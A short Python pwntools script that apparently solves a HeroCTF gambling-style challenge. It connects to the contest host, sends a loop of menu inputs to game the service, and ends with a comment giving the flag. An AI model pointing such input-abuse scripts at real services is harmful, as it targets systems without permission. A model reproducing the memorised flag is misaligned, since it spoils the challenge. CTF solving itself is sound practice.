from pwn import *

def main():
        for i in range(37):
            try:
                con.sendline("1")
                con.recvline()
                con.sendline(str(i))
                con.recvline()
                con.sendline("0100")
                con.recvline()
            except KeyboardInterrupt:
                break
            if step == 36:
                break
        con.sendline("5")
        con.sendline("1")
        con.sendline("4")
        con.sendline("5")
        con.sendline("3")
        con.interactive()


if __name__ == "__main__":
    con = remote("pwn.heroctf.fr", 9001)
    step = 1
    main()

# There is your flag king ! Hero{g4MBl1nG_f0R_dA_fL4G}